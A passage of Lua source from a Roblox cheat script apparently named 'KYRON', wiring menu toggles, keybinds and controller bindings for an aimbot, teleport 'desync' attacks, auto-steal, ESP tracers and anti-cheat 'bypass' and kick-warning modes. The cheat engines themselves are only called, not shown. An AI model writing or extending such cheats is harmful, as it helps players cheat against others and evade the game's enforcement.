              _G._KYRONLookAtEnemy.SetEnabled(arg)
            end

            pcall(saveKYRONSettings)
          end)

          KYRONRefreshMovementModes()
        end

        if Settings then
          fn78(Settings, "Safe Mode", function(arg)
            _G._KYRONSafeModeSetEnabled(arg, true)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Settings, "Kick Warning", function(arg)
            _G._KYRONKickWarningEnabled = arg == true

            if _G._KYRONKickWarning and type(_G._KYRONKickWarning.SetEnabled) == "function" then
              _G._KYRONKickWarning.SetEnabled(_G._KYRONKickWarningEnabled)
            end

            pcall(saveKYRONSettings, true)
          end)

          fn81(Utility, "Font", function()
            _G._KYRONFontMode = "DEFAULT"
            pcall(_G._KYRONApplyFontMode)
          end, function()
            _G._KYRONFontMode = "PIXEL"
            pcall(_G._KYRONApplyFontMode)
          end, _G._KYRONFontMode == "PIXEL")
        end

        if Combat then
          fn78(Combat, "Bat Aimbot", function(arg)
            _G._KYRONSafeModeSetAction("aimbot", arg)
            print("[Toggle] Bat Aimbot =", arg, "Cmb.aimbot=", combatSettings.aimbot)
            pcall(saveKYRONSettings)

            task.defer(function()
              if _G._KYRONSyncMobile then
                _G._KYRONSyncMobile()
              end
            end)
          end)

          fn78(Combat, "Auto Swing", function(swing)
            combatSettings.swing = swing
            print("[Toggle] Auto Swing (Bat) =", swing, "Cmb.swing=", combatSettings.swing)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Mirror TP", function(arg)
            combatSettings.tpMirror = arg and true or false
            _G._KYRONTPMirrorEnabled = combatSettings.tpMirror and combatSettings.aimbot

            if not _G._KYRONTPMirrorEnabled then
              table.clear(tbl36)
            end

            pcall(saveKYRONSettings, true)
          end)

          fn78(Combat, "TP Bat", function(arg)
            _G._KYRONSafeModeSetAction("tpBat", arg)
            print("[Toggle] Desync Aimbot =", arg, "Cmb.desync=", combatSettings.desync)
            pcall(saveKYRONSettings)

            task.defer(function()
              if _G._KYRONSyncMobile then
                _G._KYRONSyncMobile()
              end
            end)
          end)

          fn78(Combat, "Auto Left", function(arg)
            _G._KYRONSafeModeSetAction("autoLeft", arg)
            print("[Toggle] Auto Left =", arg, "AP.L=", autoPathState.L)
            pcall(saveKYRONSettings)

            task.defer(function()
              if _G._KYRONSyncMobile then
                _G._KYRONSyncMobile()
              end
            end)
          end)

          fn78(Combat, "Auto Right", function(arg)
            _G._KYRONSafeModeSetAction("autoRight", arg)
            print("[Toggle] Auto Right =", arg, "AP.R=", autoPathState.R)
            pcall(saveKYRONSettings)

            task.defer(function()
              if _G._KYRONSyncMobile then
                _G._KYRONSyncMobile()
              end
            end)
          end)

          fn78(Combat, "Match Speed", function(arg)
            _G._KYRONAutoPathMatchSpeed = arg == true
            print("[Toggle] Match Speed =", _G._KYRONAutoPathMatchSpeed)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Auto Steal", function(autoSteal)
            autoStealSettings.AutoSteal = autoSteal
            normalStealSettings.AutoStealEnabled = autoSteal

            if autoSteal then
              pcall(syncStealMode)
            else
              pcall(stopAllStealAutomation)
            end

            print("[Toggle] Auto Steal =", autoSteal, "Enabled.AutoSteal=", autoStealSettings.AutoSteal, "mode=", _G._KYRONStealMode)
            pcall(saveKYRONSettings)

            task.defer(function()
              if _G._KYRONSyncMobile then
                _G._KYRONSyncMobile()
              end
            end)
          end)

          fn78(Combat, "Ragdoll Steal", function(arg)
            if _G._KYRONNormalStealRagdollState and _G._KYRONNormalStealRagdollState.SetEnabled then
              _G._KYRONNormalStealRagdollState.SetEnabled(arg)
            else
              _G._KYRONRagdollStealEnabled = arg == true
            end

            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Bat Counter", function(arg)
            if arg then
              pcall(fn52)
            else
              pcall(fn53)
            end

            print("[Toggle] Bat Counter =", arg, "_G._VezyBatCounterOn=", _G._VezyBatCounterOn)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Medusa Counter", function(arg)
            flag25 = arg

            if arg then
              pcall(_G._KYRONStartMedusaCounter)
            else
              pcall(_G._KYRONStopMedusaCounterUI)
            end

            print("[Toggle] Medusa Counter =", arg, "medusaCounterEnabled=", flag25)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Hard Hit", function(arg)
            combatSettings.hardHit = arg == true
            _G._KYRONRyzenHardHit.enabled = combatSettings.hardHit
            print("[Toggle] Hard Hit =", combatSettings.hardHit, "Range=", combatSettings.hardHitRange or 10)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Hard Hit Range", function(arg)
            local n = tonumber(arg)
            if n then
              KYRONSetHardHitRange(n)
              print("[Setting] Hard Hit Range =", combatSettings.hardHitRange)
              pcall(saveKYRONSettings)
            end
          end)

          fn78(Combat, "Perfect Hit", function(arg)
            combatSettings.perfectHit = arg == true
            if combatSettings.perfectHit then
              KYRONStartPerfectHit()
            else
              KYRONStopPerfectHit()
            end
            print("[Toggle] Perfect Hit =", combatSettings.perfectHit, "Range=", combatSettings.perfectHitRange or 175)
            pcall(saveKYRONSettings)
          end)

          fn78(Combat, "Perfect Hit Range", function(arg)
            local n = tonumber(arg)
            if n then
              KYRONSetPerfectHitRange(n)
              print("[Setting] Perfect Hit Range =", combatSettings.perfectHitRange)
              pcall(saveKYRONSettings)
            end
          end)
        end

        local function fn82()
          if not Combat then
            return
          end

          for _, child in ipairs(Combat:GetChildren()) do
            if child:IsA("Frame") then
              if child.Name == "SEMI Range" then
                child.Visible = _G._KYRONStealMode == "SEMI"
              elseif child.Name == "Normal Pause %" then
                child.Visible = _G._KYRONStealMode ~= "SEMI"
              elseif child.Name == "Radius" then
                child.Visible = true
              end
            end
          end
        end

        if Combat then
          local function fn83(arg)
            _G._KYRONBatMode = arg == "BYPASS" and "BYPASS" or "DEFAULT"
            combatSettings.antiMode = _G._KYRONBatMode == "BYPASS"

            if combatSettings.aimbot then
              pcall(fn47)
              pcall(fn46)
            end

            pcall(saveKYRONSettings)
          end

          fn81(Combat, "Bat Aimbot", function()
            fn83("DEFAULT")
          end, function()
            fn83("BYPASS")
          end, _G._KYRONBatMode == "BYPASS")

          fn81(Combat, "TP Bat", function()
            _G._KYRONTpBatMode = "LOW PING"
          end, function()
            _G._KYRONTpBatMode = "HIGH PING"
          end, _G._KYRONTpBatMode == "HIGH PING")

          fn78(Combat, "TP Bat V3", function(on)
            _G._KYRONTpBatV3Enabled = on == true
            if _G._KYRONTpBatV3Enabled then
              -- V3 is independent: stop the legacy TP Bat engine while V3 is active.
              if combatSettings.desync then
                combatSettings.desync = false
                combatSettings.desyncSwing = false
                pcall(fn49)
                if handlers["TP Bat"] then handlers["TP Bat"](false, true) end
              end
              KYRONStartTpBatV3()
            else
              KYRONStopTpBatV3()
            end
            pcall(saveKYRONSettings)
          end)
          if _G._KYRONTpBatV3Enabled then
            KYRONStartTpBatV3()
          end

          fn78(Combat, "TP Bat V4 Phantom", function(on)
            _G._KYRONTpBatV4Enabled = on == true
            if _G._KYRONTpBatV4Enabled then
              -- V4 is isolated from every previous TP Bat engine.
              if combatSettings.desync then
                combatSettings.desync = false
                combatSettings.desyncSwing = false
                pcall(fn49)
                if handlers["TP Bat"] then handlers["TP Bat"](false, true) end
              end
              KYRONStopTpBatV3()
              _G._KYRONTpBatV3Enabled = false
              KYRONStartTpBatV4()
            else
              KYRONStopTpBatV4()
            end
            pcall(saveKYRONSettings)
          end)
          if _G._KYRONTpBatV4Enabled then
            _G._KYRONTpBatV3Enabled = false
            KYRONStopTpBatV3()
            KYRONStartTpBatV4()
          end

          fn81(Combat, "Bat Counter", function()
            _G._KYRONOshaBatCounter.mode = "V1"
            _G._KYRONBatCounterMode = "V1"

            if _G._KYRONOshaBatCounter.on then
              pcall(_G._KYRONOshaBatCounter.start)
            end

            pcall(saveKYRONSettings)
          end, function()
            _G._KYRONOshaBatCounter.mode = "V2"
            _G._KYRONBatCounterMode = "V2"

            if _G._KYRONOshaBatCounter.on then
              pcall(_G._KYRONOshaBatCounter.start)
            end

            pcall(saveKYRONSettings)
          end, _G._KYRONOshaBatCounter.mode == "V2")

          combatSettings.antiMode = _G._KYRONBatMode == "BYPASS"

          fn81(Combat, "Auto Steal", function()
            _G._KYRONStealMode = "NORMAL"
            fn82()

            if autoStealSettings.AutoSteal then
              pcall(stopAllStealAutomation)
              pcall(syncStealMode)
            end
          end, function()
            _G._KYRONStealMode = "SEMI"
            fn82()

            if autoStealSettings.AutoSteal then
              pcall(stopAllStealAutomation)
              pcall(syncStealMode)
            end
          end, _G._KYRONStealMode == "SEMI")

          fn82()
        end

        if Utility then
          fn78(Utility, "Neon White Tools", function(arg)
            if _G._KYRONNeonWhiteTools and _G._KYRONNeonWhiteTools.SetEnabled then
              _G._KYRONNeonWhiteTools.SetEnabled(arg)
            end

            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Anti-Lag", function(antilag)
            visualSettings.antilag = antilag

            if antilag then
              _G._KYRONLegacyStartAntiLag()
            else
              _G._KYRONLegacyStopAntiLag()
            end

            print("[Toggle] Anti-Lag =", antilag, "Util.antilag=", visualSettings.antilag)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Potato Graphics", function(arg)
            _G._KYRONPotatoGraphics = arg and true or false

            if arg then
              pcall(_G._KYRONStartVisualStrip)
            else
              pcall(_G._KYRONStopVisualStrip)
            end

            print("[Toggle] Potato Graphics =", arg)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "FOV Change", function(fov)
            visualSettings.fov = fov

            if fov then
              pcall(fn40)
            else
              pcall(fn41)
            end

            print("[Toggle] FOV =", fov, "Util.fov=", visualSettings.fov)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Stretch Res", function(stretch)
            visualSettings.stretch = stretch

            if stretch then
              pcall(fn38)
            else
              pcall(fn39)
            end

            print("[Toggle] Stretch =", stretch, "Util.stretch=", visualSettings.stretch)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "ESP", function(KYRONESPEnabled)
            if _G._KYRONESPSetEnabled then
              pcall(_G._KYRONESPSetEnabled, KYRONESPEnabled)
            else
              _G._KYRONESPEnabled = KYRONESPEnabled
            end

            print("[Toggle] ESP =", KYRONESPEnabled, "_G._KYRONESPEnabled=", _G._KYRONESPEnabled)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Show Tracer", function(KYRONESPShowTracer)
            if _G._KYRONESPSetShowTracer then
              pcall(_G._KYRONESPSetShowTracer, KYRONESPShowTracer)
            else
              _G._KYRONESPShowTracer = KYRONESPShowTracer
            end

            print("[Toggle] Show Tracer =", KYRONESPShowTracer, "_G._KYRONESPShowTracer=", _G._KYRONESPShowTracer)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Anti TP ESP", function(value)
            _G._KYRONAntiTPESP = value == true

            if not _G._KYRONAntiTPESP and _G._KYRONAntiTpEspRuntime then
              for _, state in pairs(_G._KYRONAntiTpEspRuntime.Ghosts) do
                if state.marker then
                  state.marker.Transparency = 1
                end
              end
            end

            print("[Toggle] Anti TP ESP =", _G._KYRONAntiTPESP)
            pcall(saveKYRONSettings, true)
          end)

          fn78(Utility, "Ragdoll Countdown", function(arg)
            if _G._KYRONSetRagCountdownEnabled then
              _G._KYRONSetRagCountdownEnabled(arg)
            else
              _G._KYRONRagCountdownEnabled = arg and true or false
            end

            pcall(saveKYRONSettings)
          end)

          fn78(Utility, "Try Hard Animation", function(enabled)
            _G._KYRONTryHard.enabled = enabled

            if enabled then
              task.spawn(_G._KYRONApplyTryHard)
            else
              _G._KYRONStopTryHard()
            end

            print("[Toggle] Try Hard =", enabled)
            pcall(saveKYRONSettings)
          end)
        end

        if Settings then
          fn78(Settings, "Advanced Lagger Button", function(arg)
            _G._KYRONAdvancedLaggerButton = arg and true or false

            if _G._KYRONApplyMobileButtonsHidden then
              pcall(_G._KYRONApplyMobileButtonsHidden)
            end

            if _G._KYRONSyncMobile then
              pcall(_G._KYRONSyncMobile)
            end

            pcall(saveKYRONSettings)
          end)

          if handlers["Advanced Lagger Button"] then
            handlers["Advanced Lagger Button"](_G._KYRONAdvancedLaggerButton == true, true)
          end
        end

        if Settings then
          fn78(Settings, "Circle Buttons", function(arg)
            _G._KYRONCircleButtons = arg and true or false

            if _G._KYRONApplyMobileButtonShape then
              pcall(_G._KYRONApplyMobileButtonShape)
            end

            pcall(saveKYRONSettings)
          end)

          if handlers["Circle Buttons"] then
            handlers["Circle Buttons"](_G._KYRONCircleButtons == true, true)
          end

          fn78(Settings, "Intro", function(KYRONIntroEnabled)
            _G._KYRONIntroEnabled = KYRONIntroEnabled
            pcall(saveKYRONSettings)
          end)

          if handlers.Intro then
            handlers.Intro(_G._KYRONIntroEnabled ~= false, true)
          end
        end

        local function fn83(arg, arg2, arg3)
          local v95 = fn77(arg, arg2)
          if not v95 then
            return
          end

          for _, descendant in ipairs(v95:GetDescendants()) do
            if descendant:IsA("TextButton") then
              descendant.Activated:Connect(function()
                pcall(arg3)
              end)

              return
            end
          end

          local instance6 = Instance.new("TextButton", v95)
          instance6.BackgroundTransparency = 1
          instance6.Text = ""
          instance6.Size = UDim2.new(1, 0, 1, 0)
          instance6.Position = UDim2.new(0, 0, 0, 0)
          instance6.ZIndex = 210
          instance6.AutoButtonColor = false

          instance6.Activated:Connect(function()
            pcall(arg3)
          end)
        end

        local customSky = Utility and Utility:FindFirstChild("Custom Sky")

        if customSky then
          local KYRONSkyOrder = _G._KYRONSkyOrder or { "Off" }
          local n40 = 1
          local KYRONSkyMode = _G._KYRONSkyMode or "Off"

          for i, v95 in ipairs(KYRONSkyOrder) do
            if v95 == KYRONSkyMode then
              n40 = i
              break
            end
          end

          local tbl50 = {}

          for _, descendant in ipairs(customSky:GetDescendants()) do
            if descendant:IsA("TextButton") then
              if descendant.Text == "<" then
                tbl50.prev = descendant
              elseif descendant.Text == ">" then
                tbl50.next = descendant
              end
            end
          end

          local v95 = nil

          for _, descendant in ipairs(customSky:GetDescendants()) do
            if descendant:IsA("TextButton") and descendant.Text ~= "<" and descendant.Text ~= ">" then
              v95 = descendant
            end
          end

          local function fn84()
            local v96 = KYRONSkyOrder[n40]

            if v95 then
              v95.Text = string.upper(v96)
            end

            _G._KYRONSkyMode = v96

            if v96 == "Off" then
              pcall(_G._KYRONStopSky)
            else
              pcall(_G._KYRONStartSky, v96)
            end

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end

          fn84()

          if tbl50.prev then
            tbl50.prev.Activated:Connect(function()
              n40 = (n40 - 2) % #KYRONSkyOrder + 1
              fn84()
            end)
          end

          if tbl50.next then
            tbl50.next.Activated:Connect(function()
              n40 = n40 % #KYRONSkyOrder + 1
              fn84()
            end)
          end
        end

        local KYRONMobileBtnSetActive = _G._KYRONMobileBtnSetActive or {}

        local function fn84(arg, arg2)
          if KYRONMobileBtnSetActive[arg] then
            pcall(KYRONMobileBtnSetActive[arg], arg2)
          end
        end

        _G._KYRONSetMobileActionLive = function(arg, arg2)
          fn84(arg, arg2 and true or false)
        end

        _G._KYRONSetMobileBtn = function(arg, arg2)
          do
            local v95 = ({
              autoLeft = "Auto Left",
              autoRight = "Auto Right",
              aimbot = "Bat Aimbot",
              desync = "TP Bat",
              carry = "Carry Speed",
            })[arg]

            if v95 then
              fn84(v95, arg2 and true or false)
            end

            return
          end
        end

        local function fn85()
          if movementSpeedSettings.family ~= "lagger" then
            local carry = movementSpeedSettings.carry == true
            movementSpeedSettings.family = "lagger"
            movementSpeedSettings.carry = carry
          else
            movementSpeedSettings.carry = not movementSpeedSettings.carry
          end

          if _G._KYRONAutoCarrySelectFamily then
            _G._KYRONAutoCarrySelectFamily(movementSpeedSettings.family, movementSpeedSettings.carry)
          end
        end

        local function KYRONSyncMobile()
          local pending = _G._KYRONSafeModeState and _G._KYRONSafeModeState.pending or {}
          fn84("Auto Left", pending.autoLeft and "secondary" or autoPathState.L and true or false)
          fn84("Auto Right", pending.autoRight and "secondary" or autoPathState.R and true or false)
          fn84("Bat Aimbot", pending.aimbot and "secondary" or combatSettings.aimbot and true or false)
          fn84("TP Bat", pending.tpBat and "secondary" or combatSettings.desync and true or false)
          fn84("Carry Speed", movementSpeedSettings.family == "normal" and movementSpeedSettings.carry == true or false)
          fn84(
            "Lagger Mode",
            movementSpeedSettings.family == "lagger" and not movementSpeedSettings.carry and true
              or movementSpeedSettings.family == "lagger" and movementSpeedSettings.carry and _G._KYRONAdvancedLaggerButton ~= true and "secondary"
              or false
          )
          fn84("Lagger Carry", movementSpeedSettings.family == "lagger" and movementSpeedSettings.carry and true or false)
          if _G._KYRONMobileBtnSetActive and _G._KYRONMobileBtnSetActive["Insta Reset"] then
            _G._KYRONMobileBtnSetActive["Insta Reset"](false)
          end

          if _G._KYRONRefreshMovementModes then
            _G._KYRONRefreshMovementModes()
          end

          if handlers["Bat Aimbot"] then
            handlers["Bat Aimbot"](pending.aimbot == true or combatSettings.aimbot == true, true)
          end

          if handlers["TP Bat"] then
            handlers["TP Bat"](pending.tpBat == true or combatSettings.desync == true, true)
          end

          if handlers["Auto Left"] then
            handlers["Auto Left"](pending.autoLeft == true or autoPathState.L == true, true)
          end

          if handlers["Auto Right"] then
            handlers["Auto Right"](pending.autoRight == true or autoPathState.R == true, true)
          end

          if handlers["Match Speed"] then
            handlers["Match Speed"](_G._KYRONAutoPathMatchSpeed == true, true)
          end

          if handlers["Safe Mode"] then
            handlers["Safe Mode"](_G._KYRONSafeModeEnabled == true, true)
          end

          if handlers["Kick Warning"] then
            handlers["Kick Warning"](_G._KYRONKickWarningEnabled ~= false, true)
          end

          if handlers["Auto Steal"] then
            handlers["Auto Steal"](autoStealSettings.AutoSteal and true or false, true)
          end

          if handlers["Ragdoll Steal"] then
            handlers["Ragdoll Steal"](_G._KYRONRagdollStealEnabled ~= false, true)
          end

          if handlers.Intro then
            handlers.Intro(_G._KYRONIntroEnabled ~= false, true)
          end

          if handlers["Ragdoll Countdown"] then
            handlers["Ragdoll Countdown"](_G._KYRONRagCountdownEnabled ~= false, true)
          end
        end

        _G._KYRONSyncMobile = KYRONSyncMobile

        local tbl50 = {
          ["Drop Brainrot"] = function()
            fn51()
          end,
          ["TP Down"] = function()
            fn54()
          end,
          ["Insta Reset"] = function()
            if _G._KYRONInstaReset then
              _G._KYRONInstaReset()
            end
          end,
          ["Auto Left"] = function()
            _G._KYRONSafeModeToggleAction("autoLeft")
          end,
          ["Auto Right"] = function()
            _G._KYRONSafeModeToggleAction("autoRight")
          end,
          ["Bat Aimbot"] = function()
            _G._KYRONSafeModeToggleAction("aimbot")
            pcall(saveKYRONSettings)
          end,
          ["TP Bat"] = function()
            _G._KYRONSafeModeToggleAction("tpBat")
            pcall(saveKYRONSettings)
          end,
          ["Carry Speed"] = function()
            if movementSpeedSettings.family == "normal" and movementSpeedSettings.carry then
              movementSpeedSettings.carry = false
            else
              movementSpeedSettings.family = "normal"
              movementSpeedSettings.carry = true
            end
          end,
          ["Lagger Mode"] = function()
            if _G._KYRONAdvancedLaggerButton == true then
              if movementSpeedSettings.family == "lagger" and not movementSpeedSettings.carry then
                movementSpeedSettings.family = "normal"
                movementSpeedSettings.carry = false
              else
                movementSpeedSettings.family = "lagger"
                movementSpeedSettings.carry = false
              end

              if _G._KYRONAutoCarrySelectFamily then
                _G._KYRONAutoCarrySelectFamily(movementSpeedSettings.family, movementSpeedSettings.carry)
              end
            else
              fn85()
            end
          end,
          ["Lagger Carry"] = function()
            if movementSpeedSettings.family == "lagger" and movementSpeedSettings.carry then
              movementSpeedSettings.family = "normal"
              movementSpeedSettings.carry = false
            else
              movementSpeedSettings.family = "lagger"
              movementSpeedSettings.carry = true
            end

            if _G._KYRONAutoCarrySelectFamily then
              _G._KYRONAutoCarrySelectFamily(movementSpeedSettings.family, movementSpeedSettings.carry)
            end
          end,
        }

        for _, v95 in ipairs(tbl43) do
          local v96 = tbl50[v95.Name]

          if v96 then
            v95.Activated:Connect(function()
              if not KYRONMobileBtnLocked then
                return
              end
              pcall(v96)
              KYRONSyncMobile()

              if autoSaveSettings.auto then
                task.spawn(function()
                  pcall(saveKYRONSettings)
                end)
              end
            end)
          end
        end

        local tbl51 = {
          ["Speed Key"] = function()
            if movementSpeedSettings.family == "normal" and movementSpeedSettings.carry then
              movementSpeedSettings.carry = false
            else
              movementSpeedSettings.family = "normal"
              movementSpeedSettings.carry = true
            end

            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["Lagger Mode Key"] = function()
            fn85()
            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["Drop Key"] = fn51,
          ["TP Down Key"] = fn54,
          ["Insta Reset Key"] = function()
            if _G._KYRONInstaReset then
              _G._KYRONInstaReset()
            end
          end,
          ["Bat Aimbot Key"] = function()
            _G._KYRONSafeModeToggleAction("aimbot")
            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["TP Bat Key"] = function()
            _G._KYRONSafeModeToggleAction("tpBat")
            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["Auto Left Key"] = function()
            _G._KYRONSafeModeToggleAction("autoLeft")
            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["Auto Right Key"] = function()
            _G._KYRONSafeModeToggleAction("autoRight")
            pcall(saveKYRONSettings)
            KYRONSyncMobile()
          end,
          ["UI Toggle Key"] = function()
            KYRONSetOpen(not v94)
          end,
        }

        local tbl52 = {}

        local function fn86(arg)
          for _, descendant in ipairs(arg:GetDescendants()) do
            if descendant:IsA("TextButton") and descendant.Name == "KeybindButton" then
              return descendant
            end
          end
        end

        local function fn87(arg)
          if not arg or arg == "" or arg == "..." or arg == "?" or arg == "NONE" then
            return nil
          end
          local str10 = arg:lower()

          for _, v95 in ipairs(Enum.KeyCode:GetEnumItems()) do
            if v95.Name:lower() == str10 then
              return v95
            end
          end

          if #arg == 1 then
            local str11 = arg:upper()

            for _, v95 in ipairs(Enum.KeyCode:GetEnumItems()) do
              if v95.Name == str11 then
                return v95
              end
            end
          end

          if #arg >= 3 then
            for _, v95 in ipairs(Enum.KeyCode:GetEnumItems()) do
              if v95.Name:sub(1, #arg):lower() == str10 then
                return v95
              end
            end
          end

          return nil
        end

        if Keybinds then
          for _, child in ipairs(Keybinds:GetChildren()) do
            if child:IsA("Frame") and tbl51[child.Name] then
              local v95 = fn86(child)

              if v95 then
                local name = child.Name

                if _G._KYRONKbSave and _G._KYRONKbSave[name] == "NONE" then
                  v95:SetAttribute("KeyCodeName", nil)
                  v95.Text = "NONE"
                  tbl52[name] = nil
                elseif _G._KYRONKbSave and _G._KYRONKbSave[name] then
                  local v96 = Enum.KeyCode[_G._KYRONKbSave[name]]

                  if v96 then
                    local name2 = tbl42[v96.Name] or v96.Name

                    if #name2 > 5 then
                      name2 = name2:sub(1, 10)
                    end

                    v95:SetAttribute("KeyCodeName", v96.Name)
                    v95.Text = string.upper(name2)
                    tbl52[name] = v96
                  end
                end

                local function fn88()
                  local attribute = v95:GetAttribute("KeyCodeName")
                  attribute = attribute and Enum.KeyCode[attribute] or fn87(v95.Text)

                  if attribute and attribute ~= Enum.KeyCode.Unknown then
                    tbl52[name] = attribute
                    _G._KYRONKbSave = _G._KYRONKbSave or {}
                    _G._KYRONKbSave[name] = attribute.Name
                    print("[Keybind]", name, "->", attribute.Name)

                    if autoSaveSettings.auto then
                      task.spawn(function()
                        pcall(saveKYRONSettings)
                      end)
                    end
                  else
                    tbl52[name] = nil
                    _G._KYRONKbSave = _G._KYRONKbSave or {}
                    _G._KYRONKbSave[name] = "NONE"

                    if autoSaveSettings.auto then
                      task.spawn(function()
                        pcall(saveKYRONSettings)
                      end)
                    end
                  end
                end

                fn88()
                v95:GetPropertyChangedSignal("Text"):Connect(fn88)
              end
            end
          end
        end

        local tbl53 = {}

        local function fn88(arg)
          local name = arg.Name
          return name:sub(1, 6) == "Button" or name:sub(1, 4) == "DPad" or name:sub(1, 5) == "Thumb"
        end

        local flag29 = false

        local function fn89()
          if flag29 then
            return
          end
          flag29 = true

          task.defer(function()
            flag29 = false
            pcall(saveKYRONSettings)
          end)
        end

        if Controller then
          for _, child in ipairs(Controller:GetChildren()) do
            if child:IsA("Frame") and tbl51[child.Name] then
              local v95 = fn86(child)

              if v95 then
                v95:SetAttribute("CtrlOnly", true)
                local name = child.Name
                v95:SetAttribute("KYRONControllerAction", name)
                local KYRONCtrlSave = _G._KYRONCtrlSave and _G._KYRONCtrlSave[name] or v95.Text

                if _G._KYRONCtrlSave and _G._KYRONCtrlSave[name] == "NONE" then
                  v95:SetAttribute("KeyCodeName", nil)
                  v95.Text = "NONE"
                  tbl53[name] = nil
                end

                local v96 = nil

                if KYRONCtrlSave then
                  pcall(function()
                    v96 = Enum.KeyCode[KYRONCtrlSave]
                  end)
                end

                if v96 and fn88(v96) then
                  local name2 = tbl42[v96.Name] or v96.Name

                  if #name2 > 5 then
                    name2 = name2:sub(1, 5)
                  end

                  v95:SetAttribute("KeyCodeName", v96.Name)
                  v95.Text = string.upper(name2)
                  tbl53[name] = v96
                end

                local function fn90()
                  local attribute = v95:GetAttribute("KeyCodeName")
                  local v97 = attribute and Enum.KeyCode[attribute] or nil

                  if v97 and v97 ~= Enum.KeyCode.Unknown and fn88(v97) then
                    tbl53[name] = v97
                    _G._KYRONCtrlSave = _G._KYRONCtrlSave or {}
                    _G._KYRONCtrlSave[name] = v97.Name
                  else
                    tbl53[name] = nil
                    _G._KYRONCtrlSave = _G._KYRONCtrlSave or {}
                    _G._KYRONCtrlSave[name] = "NONE"
                  end

                  if _G._KYRONSettingsReady == true then
                    pcall(_G._KYRONPersistControllerBindings)
                  end

                  fn89()
                end

                fn90()
                v95:GetPropertyChangedSignal("Text"):Connect(fn90)
                v95:GetAttributeChangedSignal("KeyCodeName"):Connect(fn90)
              end
            end
          end
        end

        if Controller then
          local resetAllController = fn77(Controller, "RESET ALL CONTROLLER")

          if resetAllController then
            local instance6 = Instance.new("TextButton", resetAllController)
            instance6.BackgroundTransparency = 1
            instance6.Text = ""
            instance6.Size = UDim2.new(1, 0, 1, 0)
            instance6.ZIndex = 200
            instance6.AutoButtonColor = false

            instance6.Activated:Connect(function()
              _G._KYRONCtrlSave = {}

              for k in pairs(tbl53) do
                tbl53[k] = nil
              end

              for _, child in ipairs(Controller:GetChildren()) do
                if child:IsA("Frame") and tbl51[child.Name] then
                  local v95 = fn86(child)

                  if v95 then
                    v95:SetAttribute("KeyCodeName", nil)
                    v95.Text = "NONE"
                  end
                end
              end

              pcall(_G._KYRONPersistControllerBindings)
              fn89()
            end)
          end
        end

        UserInputService.InputBegan:Connect(function(input, gameProcessed)
          if gameProcessed then
            return
          end

          if v87 then
            return
          end

          if _G._KYRONLpListening then
            return
          end

          if UserInputService:GetFocusedTextBox() then
            return
          end
          local keyCode = input.KeyCode
          if keyCode == Enum.KeyCode.Unknown then
            return
          end

          for k, v95 in pairs(tbl52) do
            if v95 == keyCode then
              local v96 = tbl51[k]

              if v96 then
                pcall(v96)
              end
            end
          end

          for k, v95 in pairs(tbl53) do
            if v95 == keyCode then
              local v96 = tbl51[k]

              if v96 then
                pcall(v96)
              end
            end
          end
        end)

        task.spawn(function()
          task.wait(0.35)

          if _G._KYRONIntroPlaying then
            _G._KYRONRevealMainAfterIntro = function()
              if _G._KYRONRevealStealBarAfterIntro then
                _G._KYRONRevealStealBarAfterIntro()
              end

              KYRONSetOpen(true, true)
              task.delay(0.5, loadCustomFont)
            end
          else
            if _G._KYRONRevealStealBarAfterIntro then
              _G._KYRONRevealStealBarAfterIntro()
            end

            KYRONSetOpen(true)
            task.delay(0.5, loadCustomFont)
          end

          task.wait(0.15)
          pcall(_G._KYRONApplyFontMode, screenGui)

          if flag16 then
            ragdollRecoveryState.enabled = true
            pcall(startRagdollRecovery)

            if handlers["Anti Ragdoll"] then
              handlers["Anti Ragdoll"](true, true)
            end
          end

          if _G._KYRONLoadedOnLookAtEnemy then
            if _G._KYRONLookAtEnemy and _G._KYRONLookAtEnemy.SetEnabled then
              _G._KYRONLookAtEnemy.SetEnabled(true)
            end

            if handlers.Bodylock then
              handlers.Bodylock(true, true)
            end
          end

          if _G._KYRONLoadedOnNeonWhiteTools then
            if _G._KYRONNeonWhiteTools and _G._KYRONNeonWhiteTools.SetEnabled then
              _G._KYRONNeonWhiteTools.SetEnabled(true)
            end

            if handlers["Neon White Tools"] then
              handlers["Neon White Tools"](true, true)
            end
          end

          if flag17 then
            autoTeleportState.enabled = true
            pcall(_G._KYRONStartAutoTP)

            if handlers["Auto TP Down"] then
              handlers["Auto TP Down"](true, true)
            end
          end

          _G._KYRONSafeModeSetEnabled(_G._loadedOn_safeMode == true, false)

          if handlers["Safe Mode"] then
            handlers["Safe Mode"](_G._KYRONSafeModeEnabled == true, true)
          end

          _G._KYRONKickWarningEnabled = _G._loadedOn_kickWarning ~= false

          if _G._KYRONKickWarning and type(_G._KYRONKickWarning.SetEnabled) == "function" then
            _G._KYRONKickWarning.SetEnabled(_G._KYRONKickWarningEnabled)
          end

          if handlers["Kick Warning"] then
            handlers["Kick Warning"](_G._KYRONKickWarningEnabled, true)
          end

          if _G._KYRONNormalStealRagdollState and _G._KYRONNormalStealRagdollState.SetEnabled then
            _G._KYRONNormalStealRagdollState.SetEnabled(_G._KYRONRagdollStealEnabled ~= false)
          end

          if handlers["Ragdoll Steal"] then
            handlers["Ragdoll Steal"](_G._KYRONRagdollStealEnabled ~= false, true)
          end

          if _G._loadedOn_batAimbot then
            _G._KYRONSafeModeSetAction("aimbot", true)
          end

          combatSettings.tpMirror = _G._loadedOn_mirrorTP == true

          if combatSettings.perfectHit then
            pcall(KYRONStartPerfectHit)
          end

          if _G._loadedOn_desyncAimbot then
